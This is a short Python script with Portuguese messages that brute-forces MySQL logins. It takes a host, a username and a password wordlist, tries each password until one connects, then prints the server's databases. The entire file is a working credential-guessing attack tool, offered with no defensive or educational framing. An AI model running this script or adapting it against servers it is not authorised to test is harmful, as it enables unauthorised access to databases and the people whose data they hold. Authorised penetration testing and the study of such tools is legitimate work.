#!/usr/bin/python3

import mysql.connector as mysql
import sys

def brute(hst,usr,pwd):
	with open(pwd) as wl:
		for p in wl:
			p = p.strip()
			try:
				db = mysql.connect(
				host = hst,
				user = usr,
				passwd = p
				)
				print ("\nSENHA ENCONTRADA: --------------> '%s':'%s'"%(usr,p))
				cursor = db.cursor()
				print ('\nBANCOS:\n')
				cursor.execute("SHOW DATABASES")
				databases = cursor.fetchall()
				for database in databases:
					print (database)
				sys.exit()
			except mysql.errors.ProgrammingError:
				print ('Tentando %s:%s'%(usr,p))

def main():
	hst = sys.argv[1]
	usr = sys.argv[2]
	pwd = sys.argv[3]

	brute(hst,usr,pwd)

if __name__ == '__main__':
	main()
